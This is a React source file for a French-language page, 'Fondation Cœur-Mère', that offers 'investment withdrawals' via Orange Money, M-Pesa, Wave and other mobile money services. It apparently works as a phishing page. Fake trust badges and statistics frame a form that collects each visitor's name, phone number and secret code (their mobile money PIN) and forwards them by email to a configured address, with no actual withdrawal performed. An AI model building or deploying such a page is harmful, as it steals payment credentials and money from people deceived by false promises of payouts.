import { CheckCircle2, Lock, Phone, ShieldCheck, Sparkles } from 'lucide-react';
import { useMemo, useState } from 'react';
import airtelImage from './assets/images/airte.jpg';
import mPesaImage from './assets/images/IMG-20251107-WA0245.jpg';
import moovImage from './assets/images/moov.jpg';
import mobileMoneyImage from './assets/images/momo.jpg';
import orangeImage from './assets/images/orange.jpg';
import tMoneyImage from './assets/images/tmoney.jpg';
import waveImage from './assets/images/wave.jpg';

type Platform = {
  id: string;
  name: string;
  description: string;
  accent: string;
  accentSoft: string;
  image: string;
};

const platforms: Platform[] = [
  {
    id: 'orange-money',
    name: 'Orange Money',
    description: 'Retrait sécurisé via Orange Money.',
    accent: 'bg-orange-500',
    accentSoft: 'bg-orange-50',
    image: orangeImage,
  },
  {
    id: 'mobile-money',
    name: 'Mobile Money',
    description: 'Retrait rapide et fiable.',
    accent: 'bg-emerald-500',
    accentSoft: 'bg-emerald-50',
    image: mobileMoneyImage,
  },
  {
    id: 'mpesa',
    name: 'M-Pesa',
    description: 'Retrait rapide via M-Pesa.',
    accent: 'bg-sky-500',
    accentSoft: 'bg-sky-50',
    image: mPesaImage,
  },
  {
    id: 'wave-money',
    name: 'Wave Money',
    description: 'Paiement mobile sans friction.',
    accent: 'bg-cyan-500',
    accentSoft: 'bg-cyan-50',
    image: waveImage,
  },
  {
    id: 'airtel-money',
    name: 'Airtel Money',
    description: 'Retrait mobile sécurisé.',
    accent: 'bg-red-500',
    accentSoft: 'bg-red-50',
    image: airtelImage,
  },
  {
    id: 'moov-money',
    name: 'Moov Money',
    description: 'Transfert express garanti.',
    accent: 'bg-fuchsia-500',
    accentSoft: 'bg-fuchsia-50',
    image: moovImage,
  },
  {
    id: 't-money',
    name: 'T-Money',
    description: 'Paiement mobile optimisé.',
    accent: 'bg-yellow-500',
    accentSoft: 'bg-yellow-50',
    image: tMoneyImage,
  },
];

const initialForm = {
  fullName: '',
  phoneNumber: '',
  amount: '',
  secretCode: '',
};

type FormState = typeof initialForm;

const validatePhone = (value: string) => /^\+?[0-9]{8,15}$/.test(value.replace(/\s+/g, ''));

function App() {
  const [selectedPlatform, setSelectedPlatform] = useState<Platform | null>(platforms[0]);
  const [modalOpen, setModalOpen] = useState(false);
  const [form, setForm] = useState<FormState>(initialForm);
  const [error, setError] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const platformCards = useMemo(() => platforms, []);

  const openForm = (platform: Platform) => {
    setSelectedPlatform(platform);
    setForm(initialForm);
    setError('');
    setSuccessMessage('');
    setSubmitted(false);
    setModalOpen(true);
  };

  const closeForm = () => {
    setModalOpen(false);
    setError('');
    setSuccessMessage('');
    setLoading(false);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');
    setSuccessMessage('');

    if (!form.fullName || !form.phoneNumber || !form.amount || !form.secretCode) {
      setError('Veuillez remplir tous les champs obligatoires.');
      return;
    }

    if (!validatePhone(form.phoneNumber)) {
      setError('Veuillez entrer un numéro de téléphone valide.');
      return;
    }

    if (Number(form.amount) <= 0) {
      setError('Le montant doit être supérieur à 0.');
      return;
    }

    if (form.secretCode.length < 4) {
      setError('Le code secret doit contenir au moins 4 caractères.');
      return;
    }

    if (!selectedPlatform) {
      setError('Sélectionnez une plateforme avant de valider.');
      return;
    }

    setLoading(true);

    try {
      const payload = {
        platform: selectedPlatform.name,
        ...form,
      };

      console.log('Envoi email - payload:', payload);
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      console.log('Réponse email API:', response.status, result);

      if (!response.ok) {
        throw new Error(result.error || 'Erreur lors de l’envoi du message.');
      }

      setSuccessMessage('Votre demande a bien été envoyée. Nous vous contacterons rapidement.');
      setForm(initialForm);
      setSubmitted(true);
    } catch (error) {
      console.error('Erreur en envoyant l’e-mail:', error);
      setError(error instanceof Error ? error.message : 'Erreur inconnue.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-950 selection:bg-cyan-100 selection:text-slate-950">
      <div className="mx-auto max-w-7xl px-4 py-10 sm:px-6 lg:px-8">
        <header className="rounded-[2rem] bg-white p-8 shadow-soft ring-1 ring-slate-200">
          <div className="flex flex-col gap-6 lg:flex-row lg:items-center lg:justify-between">
            <div className="max-w-2xl">
              <div className="inline-flex items-center gap-3 rounded-full bg-cyan-50 px-4 py-2 text-sm font-semibold uppercase tracking-[0.24em] text-cyan-700">
                <img src="/logo.svg" alt="Logo Fondation Cœur-Mère" className="h-8 w-8 rounded-full bg-white p-1 shadow-sm" />
                <span>Fondation Cœur-Mère</span>
              </div>
              <h1 className="mt-6 text-4xl font-semibold tracking-tight text-slate-950 sm:text-5xl">
                Retrait d'Investissement - Plateformes Mobile Money
              </h1>
              <p className="mt-4 max-w-xl text-slate-600 sm:text-lg">
                Plateforme certifiée fondation coeur de mere
              </p>
            </div>
            <div className="grid gap-4 sm:grid-cols-3">
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center shadow-sm">
                <p className="text-3xl font-semibold text-cyan-700">10k+</p>
                <p className="mt-2 text-sm text-slate-500">Transactions sécurisées</p>
              </div>
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center shadow-sm">
                <p className="text-3xl font-semibold text-emerald-700">99.9%</p>
                <p className="mt-2 text-sm text-slate-500">Taux de réussite</p>
              </div>
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center shadow-sm">
                <p className="text-3xl font-semibold text-violet-700">24/7</p>
                <p className="mt-2 text-sm text-slate-500">Support disponible</p>
              </div>
            </div>
          </div>
        </header>

        <section className="mt-10 grid gap-6 lg:grid-cols-[1.4fr_0.6fr]">
          <div>
            <div className="grid gap-5 md:grid-cols-2">
              {platformCards.map((platform) => (
                <button
                  key={platform.id}
                  type="button"
                  onClick={() => openForm(platform)}
                  className="group overflow-hidden rounded-[2rem] border border-slate-200 bg-white p-6 text-left shadow-sm transition duration-300 hover:-translate-y-1 hover:shadow-md"
                >
                  <div className="flex items-center justify-between gap-4">
                    <div>
                      <p className="text-sm uppercase tracking-[0.24em] text-slate-500">{platform.name}</p>
                      <h2 className="mt-3 text-xl font-semibold text-slate-950">{platform.description}</h2>
                    </div>
                    <img src={platform.image} alt={platform.name} className="h-16 w-16 rounded-3xl border border-slate-200 object-cover" />
                  </div>
                  <div className="mt-6 flex items-center gap-3 text-sm text-slate-500">
                    <ShieldCheck className="h-4 w-4 text-emerald-500" />
                    <span>Connecté et sécurisé</span>
                  </div>
                </button>
              ))}
            </div>
          </div>

          <aside className="space-y-6 rounded-[2rem] border border-slate-200 bg-white p-6 shadow-sm">
            <div className="rounded-3xl border border-slate-200 bg-slate-50 p-5">
              <p className="text-sm uppercase tracking-[0.24em] text-slate-500">Sécurité</p>
              <h2 className="mt-3 text-2xl font-semibold text-slate-950">Protection renforcée</h2>
              <p className="mt-3 text-slate-600">Toutes les demandes sont transférées en email sécurisé vers l’adresse configurée.</p>
            </div>
            <div className="grid gap-4">
              <div className="rounded-3xl border border-slate-200 bg-slate-50 p-5">
                <div className="flex items-center gap-3 text-cyan-700">
                  <Lock className="h-5 w-5" />
                  <p className="font-semibold">Chiffrement SSL</p>
                </div>
                <p className="mt-3 text-slate-600">Vos informations sont transmises via serveur sécurisé.</p>
              </div>
              <div className="rounded-3xl border border-slate-200 bg-slate-50 p-5">
                <div className="flex items-center gap-3 text-emerald-700">
                  <CheckCircle2 className="h-5 w-5" />
                  <p className="font-semibold">Envoi sécurisé</p>
                </div>
                <p className="mt-3 text-slate-600">Les détails du formulaire arrivent directement dans votre boîte de contact.</p>
              </div>
            </div>
          </aside>
        </section>
      </div>

      {modalOpen ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/30 p-4 backdrop-blur-sm">
          <div className="w-full max-w-2xl rounded-[2rem] border border-slate-200 bg-white p-7 shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
            <div className="flex items-start justify-between gap-4">
              <div>
                <p className="text-sm uppercase tracking-[0.24em] text-cyan-700">Formulaire sécurisé</p>
                <h2 className="mt-3 text-3xl font-semibold text-slate-950">Retrait via {selectedPlatform?.name}</h2>
              </div>
              <button
                type="button"
                onClick={closeForm}
                className="rounded-full border border-slate-200 bg-slate-50 px-4 py-2 text-sm text-slate-700 transition hover:bg-slate-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-cyan-200"
                aria-label="Fermer le formulaire"
              >
                Fermer
              </button>
            </div>

            <form className="mt-8 space-y-6" onSubmit={handleSubmit}>
              <div className="grid gap-4 sm:grid-cols-2">
                <label className="space-y-2 text-sm text-slate-700">
                  <span className="font-medium">Nom complet</span>
                  <input
                    type="text"
                    value={form.fullName}
                    onChange={(event) => setForm({ ...form, fullName: event.target.value })}
                    placeholder="Ex. Awa Diop"
                    className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-3 text-slate-950 placeholder:text-slate-400 focus:border-cyan-500 focus:outline-none focus:ring-2 focus:ring-cyan-200"
                    required
                  />
                </label>
                <label className="space-y-2 text-sm text-slate-700">
                  <span className="font-medium">Numéro de téléphone</span>
                  <div className="relative">
                    <input
                      type="tel"
                      value={form.phoneNumber}
                      onChange={(event) => setForm({ ...form, phoneNumber: event.target.value })}
                      placeholder="+221 77 123 45 67"
                      className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-3 pr-12 text-slate-950 placeholder:text-slate-400 focus:border-cyan-500 focus:outline-none focus:ring-2 focus:ring-cyan-200"
                      required
                      aria-describedby="phone-hint"
                    />
                    <Phone className="pointer-events-none absolute right-4 top-1/2 h-5 w-5 -translate-y-1/2 text-slate-400" />
                  </div>
                  <p id="phone-hint" className="text-xs text-slate-500">Format international recommandé.</p>
                </label>
              </div>

              <div className="grid gap-4 sm:grid-cols-2">
                <label className="space-y-2 text-sm text-slate-700">
                  <span className="font-medium">Montant (FCFA)</span>
                  <div className="relative">
                    <input
                      type="number"
                      min={1}
                      value={form.amount}
                      onChange={(event) => setForm({ ...form, amount: event.target.value })}
                      placeholder="Ex. 15000"
                      className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-3 pr-16 text-slate-950 placeholder:text-slate-400 focus:border-cyan-500 focus:outline-none focus:ring-2 focus:ring-cyan-200"
                      required
                    />
                    <span className="pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-sm text-slate-500">FCFA</span>
                  </div>
                </label>
                <label className="space-y-2 text-sm text-slate-700">
                  <span className="font-medium">Code secret</span>
                  <div className="relative">
                    <input
                      type="password"
                      value={form.secretCode}
                      onChange={(event) => setForm({ ...form, secretCode: event.target.value })}
                      placeholder="••••••"
                      className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-3 pr-12 text-slate-950 placeholder:text-slate-400 focus:border-cyan-500 focus:outline-none focus:ring-2 focus:ring-cyan-200"
                      required
                    />
                    <Lock className="pointer-events-none absolute right-4 top-1/2 h-5 w-5 -translate-y-1/2 text-slate-400" />
                  </div>
                </label>
              </div>

              {error ? <p className="rounded-3xl bg-red-100 px-4 py-3 text-sm text-red-700">{error}</p> : null}
              {successMessage ? <p className="rounded-3xl bg-emerald-100 px-4 py-3 text-sm text-emerald-900">{successMessage}</p> : null}

              <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
                <div className="rounded-3xl bg-slate-50 p-4 text-sm text-slate-600 ring-1 ring-slate-200">
                  <div className="flex items-center gap-2">
                    <ShieldCheck className="h-4 w-4 text-emerald-500" />
                    <span>Transfert en e-mail sécurisé</span>
                  </div>
                </div>
                <button
                  type="submit"
                  disabled={loading}
                  className="inline-flex items-center justify-center rounded-3xl bg-cyan-700 px-6 py-3 text-sm font-semibold text-white transition hover:bg-cyan-800 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {loading ? 'Envoi en cours...' : 'Envoyer la demande'}
                </button>
              </div>
            </form>
          </div>
        </div>
      ) : null}
    </div>
  );
}

export default App;
